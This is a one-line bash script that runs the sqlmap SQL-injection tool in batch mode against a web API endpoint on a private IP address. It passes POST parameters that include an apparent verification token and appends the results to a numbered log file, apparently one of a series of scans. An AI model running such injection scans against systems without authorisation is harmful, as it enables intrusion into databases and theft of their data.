#!/bin/bash
python /Users/zhaichuang/Downloads/sqlmapproject-sqlmap-1c737d7/sqlmap.py -u "http://172.16.56.199/api/whistleMS/index.php" --data "m=im&a=groupOrgAdd&device_type=web&school=ligong&verify=admin_ligong_MS_ligong__web__5a5f308da9efe__216b8a4119eec5a569326798cb336b7b__86269202-142f-4740-99b2-21324ea1c133&type=1&org_ids=2526" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/150.log